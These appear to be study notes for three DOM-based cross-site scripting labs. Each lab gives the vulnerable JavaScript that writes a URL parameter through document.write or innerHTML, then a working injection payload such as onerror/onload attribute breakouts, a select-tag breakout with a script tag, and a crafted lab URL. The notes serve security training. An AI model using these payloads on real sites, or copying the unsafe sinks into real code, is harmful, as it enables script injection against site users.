### lab1
```js
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'); 
} 
var query = (new URLSearchParams(window.location.search)).get('search'); 
if(query) {
	trackSearch(query);
}
IN DOM
<img src="/resources/images/tracker.gif?searchTerms=a">
________
Exploit
a" onload=alert(1)>//    OR
a"><img src=1 onerror=alert(1)>

```

### lab2
#### Adding unexpected argument
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
	document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');

_______IN DOM_____
<select name="storeId">
	<option selected>a</option>
	<option>London</option>
	<option>Paris</option>
	<option>Milan</option>
</select>
_________Exploit______
a</option></select><script>alert(1)</script>
```


### lab 3
```js
function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
_______________
Exploit
<img src=a onerror=alert(1)>
https://web-security-academy.net/?search=%3Cimg+src%3Da+onerror%3Dalert%281%29%3E
```